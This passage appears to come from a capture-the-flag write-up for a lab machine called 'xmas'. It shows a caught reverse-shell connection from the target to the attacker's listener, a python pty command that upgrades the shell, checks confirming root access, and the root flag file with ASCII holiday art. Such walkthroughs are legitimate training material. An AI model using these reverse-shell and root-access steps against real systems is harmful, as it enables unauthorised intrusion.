connect to [10.0.2.15] from (UNKNOWN) [10.0.2.21] 50764
python3 -c 'import pty;pty.spawn("/bin/bash")'
root@xmas:/home/alabaster/PublishList# 

```
The connection has been made, now let's prove that we are root on this system and capture the root flag.
```bash
root@xmas:/home/alabaster/PublishList# whoami;id;hostname;ip a
whoami;id;hostname
root
uid=0(root) gid=0(root) groups=0(root)
xmas
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 08:00:27:b1:ae:10 brd ff:ff:ff:ff:ff:ff
    inet 10.0.2.21/24 metric 100 brd 10.0.2.255 scope global dynamic enp0s3
       valid_lft 301sec preferred_lft 301sec
    inet6 fe80::a00:27ff:feb1:ae10/64 scope link 
       valid_lft forever preferred_lft forever

root@xmas:/home/alabaster/PublishList# cd /root
cd /root
root@xmas:~# ls
ls
root.txt  snap
root@xmas:~# cat root.txt
cat root.txt
      __,_,_,___)          _______
    (--| | |             (--/    ),_)        ,_) 
       | | |  _ ,_,_        |     |_ ,_ ' , _|_,_,_, _  ,
     __| | | (/_| | (_|     |     | ||  |/_)_| | | |(_|/_)___,
    (      |___,   ,__|     \____)  |__,           |__,

                            |                         _...._
                         \  _  /                    .::o:::::.
                          (\o/)                    .:::'''':o:.
                      ---  / \  ---                :o:_    _:::
                           >*<                     `:}_>()<_{:'
                          >0<@<                 @    `'//\\'`    @ 
                         >>>@<<*              @ #     //  \\     # @
                        >@>*<0<<<           __#_#____/'____'\____#_#__
                       >*>>@<<<@<<         [__________________________]
                      >@>>0<<<*<<@<         |=_- .-/\ /\ /\ /\--. =_-|
                     >*>>0<<@<<<@<<<        |-_= | \ \\ \\ \\ \ |-_=-|
                    >@>>*<<@<>*<<0<*<       |_=-=| / // // // / |_=-_|
      \*/          >0>>*<<@<>0><<*<@<<      |=_- |`-'`-'`-'`-'  |=_=-|
  ___\\U//___     >*>>@><0<<*>>@><*<0<<     | =_-| o          o |_==_| 
  |\\ | | \\|    >@>>0<*<<0>>@<<0<<<*<@<    |=_- | !     (    ! |=-_=|
  | \\| | _(UU)_ >((*))_>0><*<0><@<<<0<*<  _|-,-=| !    ).    ! |-_-=|_
  |\ \| || / //||.*.*.*.|>>@<<*<<@>><0<<@</=-((=_| ! __(:')__ ! |=_==_-\
  |\\_|_|&&_// ||*.*.*.*|_\\db//__     (\_/)-=))-|/^\=^=^^=^=/^\| _=-_-_\
  """"|'.'.'.|~~|.*.*.*|     ____|_   =('.')=//   ,------------.      
      |'.'.'.|   ^^^^^^|____|>>>>>>|  ( ~~~ )/   (((((((())))))))   
      ~~~~~~~~         '""""`------'  `w---w`     `------------'
      Flag HMV{HERE_IS_THE_FLAG}
root@xmas:~# 

```
